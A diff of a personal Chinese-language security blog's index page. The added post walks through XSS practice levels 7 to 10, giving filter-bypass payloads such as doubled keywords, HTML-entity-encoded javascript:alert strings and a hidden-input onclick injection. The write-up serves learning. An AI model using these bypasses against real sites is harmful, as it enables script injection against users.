@@ -73,6 +73,74 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-xss-7-10" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/02/13/xss-7-10/" class="article-date">
+  <time class="dt-published" datetime="2024-02-13T08:47:46.000Z" itemprop="datePublished">2024-02-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/02/13/xss-7-10/">xss_7~10</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;a&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onblur=&#x27;alert(/1/)&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(&#x27;a&#x27;)&quot;&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>第七关</strong></p>
+<p>on script href都被过滤，变成空白，双写注入“ oonnblur&#x3D;’alert(&#x2F;1&#x2F;)’”</p>
+<p><strong>第八关</strong></p>
+<p>直接输入，发现输入语句出现在两个地方</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;&lt;scr_ipt&gt;alert(&#x27;a&#x27;)&lt;/scr_ipt&gt;&quot;&gt;友情链接&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;&lt;script&gt;alert(&#x27;a&#x27;)&lt;/script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>双引号被编码化，无法闭合</p>
+<p>因为内容在标签的属性里面，属性值可以用编码化的方式绕过</p>
+<p>编码：<br>&#x2F;&#x2F; 采用十进制ascii码<br>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#106;&amp;#97;&amp;#100;&amp;#101;&amp;#110;&amp;#34;&amp;#41;<br>&#x2F;&#x2F; 或者十六进制unicode编码<br>&amp;#x006a;&amp;#x0061;&amp;#x0076;&amp;#x0061;&amp;#x0073;&amp;#x0063;&amp;#x0072;&amp;#x0069;&amp;#x0070;&amp;#x0074;&amp;#x003a;&amp;#x0061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0022;&amp;#x006a;&amp;#x0061;&amp;#x0064;&amp;#x0065;&amp;#x006e;&amp;#x0022;&amp;#x0029;</p>
+<p><strong>第九关</strong></p>
+<p>&#x2F;，&#x3D;进行了转义，使用绕过的方法无法注释掉后面</p>
+<p>写上一个正确的网址会出现在href属性里</p>
+<p>javascript:alert(“a”)&#x2F;&#x2F;<a target="_blank" rel="noopener" href="http://www.baidu.com/">http://www.baidu.com</a> 但是前面的<br>javascript:alert(“a”) &#x2F;&#x2F; 要进行编码，不然会被加上_</p>
+<p>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#106;&amp;#97;&amp;#100;&amp;#101;&amp;#110;&amp;#34;&amp;#41;&#x2F;&#x2F;<a target="_blank" rel="noopener" href="http://www.baidu.com/">http://www.baidu.com</a></p>
+<p><strong>第十关</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_link&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>get传递</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_link=a&amp;t_history=b&amp;t_sort=c</span><br></pre></td></tr></table></figure>
+
+<p>发现第三个能接收</p>
+<p>“ type&#x3D;’text’ onclick&#x3D;’alert(‘1’)’<br>成功</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/02/13/xss-7-10/" data-id="clto5uldd000ftwb5d5mef2xi" data-title="xss_7~10" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-xss4-6" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/02/13/xss4-6/" class="article-date">
@@ -114,7 +182,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/13/xss4-6/" data-id="clth90jg8000g1wb50c7i4n9m" data-title="xss4~6" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/13/xss4-6/" data-id="clto5uldd000htwb55vk57kvj" data-title="xss4~6" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -171,7 +239,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/12/xss1-3/" data-id="clth90jg7000e1wb548kdbk3l" data-title="xss1~3" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/12/xss1-3/" data-id="clto5uldd000gtwb5h2vz8yiq" data-title="xss1~3" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -241,7 +309,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/11/sql16-20/" data-id="clth90jg600091wb5hos10zwl" data-title="sql16~20" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/11/sql16-20/" data-id="clto5uldc000btwb57djj5yd9" data-title="sql16~20" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -301,7 +369,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/09/sql11-15/" data-id="clth90jg500071wb5g33b29lp" data-title="sql11~15" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/09/sql11-15/" data-id="clto5uldb0009twb5h0tx1m6e" data-title="sql11~15" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -490,7 +558,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/07/sql1-10/" data-id="clth90jg6000a1wb5bk364mud" data-title="sql1~10" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/07/sql1-10/" data-id="clto5uldb0008twb5ew02aayd" data-title="sql1~10" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -586,7 +654,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/03/sql/" data-id="clth90jg500061wb5gydi3r55" data-title="sql" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/03/sql/" data-id="clto5ulda0006twb567gufx0q" data-title="sql" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -681,7 +749,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/02/03/php/" data-id="clth90jg400031wb5gv05ff4f" data-title="php" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/02/03/php/" data-id="clto5ulda0004twb52n24gben" data-title="php" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -740,7 +808,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/01/29/python/" data-id="clth90jg400041wb52rb35hq3" data-title="python" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/01/29/python/" data-id="clto5uldb0007twb5dgyn1qgj" data-title="python" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -781,63 +849,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/01/22/baidu/" data-id="clth90jg300021wb5g7e69ib0" data-title="baidu" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-二阶段" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/01/21/%E4%BA%8C%E9%98%B6%E6%AE%B5/" class="article-date">
-  <time class="dt-published" datetime="2024-01-21T13:40:24.000Z" itemprop="datePublished">2024-01-21</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/01/21/%E4%BA%8C%E9%98%B6%E6%AE%B5/">二阶段</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>HTTP 协议是现代 Web 应用的基础协议 </p>
-<p>协议的请求-响应模型是其最基本的特征。客户端向服务器发送一个请求，服务器接收请求并返回一个响应。 </p>
-<p>报文头中包含了请求或响应的一些元信息，比如请求方法、URL、协议版本、状态码等。报文体则包含了具体的数据内容。 </p>
-<p>….</p>
-<p>域名是互联网上用于标识和定位网站的字符串。每个网站都有一个唯一的域名，可以通过这个域名来访问网站。</p>
-<p>….</p>
-<p>在互联网中，每个设备都有一个唯一的 IP 地址，用于标识和定位这个设备。</p>
-<p>IP 地址的作用是让不同的设备能够互相通信。当一个设备要向另一个设备发送数据时，它会将数据打包成 IP 数据报的格式，并在其中包含目标设备的 IP 地址和自己的 IP 地址等信息。随后，这个 IP 数据报会被传递给网络中的路由器，路由器会根据目标 IP 地址将数据报转发到下一个路由器，直到最终到达目标设备。</p>
-<p>….</p>
-<p>Get&#x2F;Post是HTTP 协议中的两种请求方法，用于向服务器发送请求并获取响应。</p>
-<p>Get 请求是一种非常常见的请求方法，它通常用于获取资源和查询数据。当客户端向服务器发送一个 Get 请求时，请求参数会附在 URL 后面</p>
-<p>Post请求文件等，更为安全。 Post 请求没有长度限制，可以传输大量的数据。 </p>
-<p>浏览器先发送header，服务器会响应100，浏览器再次发送data，服务器返回200，请求成功 </p>
-<p>用户post需要用到工具</p>
-<p>….</p>
-<p>TCP&#x2F;IP </p>
-<p>是网络通信模型 </p>
-<p>TCP&#x2F;IP提供了点对点链接的机制，将资料应该如何封装、寻址、传输、路由以及在目的地如何接收，都加以标准化。它将软件通信过程抽象化为四个抽象层，采取协议堆栈的方式，分别实现出不同通信协议。协议族下的各种协议，依其功能不同，分别归属到这四个层次结构之中，常视为是简化的七层OSI模型</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/01/21/%E4%BA%8C%E9%98%B6%E6%AE%B5/" data-id="clth90jg8000h1wb54dj21dcy" data-title="二阶段" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/01/22/baidu/" data-id="clto5uld90002twb55fyl4cv4" data-title="baidu" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -899,6 +911,10 @@
       <ul>
         
           <li>
+            <a href="/2024/03/12/XXE/">XXE</a>
+          </li>
+        
+          <li>
             <a href="/2024/03/07/ssrf/">ssrf</a>
           </li>
         
@@ -912,10 +928,6 @@
         
           <li>
             <a href="/2024/03/03/phototype/">phototype</a>
-          </li>
-        
-          <li>
-            <a href="/2024/03/03/n-ez-unserilize/">n_ez_unserilize</a>
           </li>
         
       </ul>
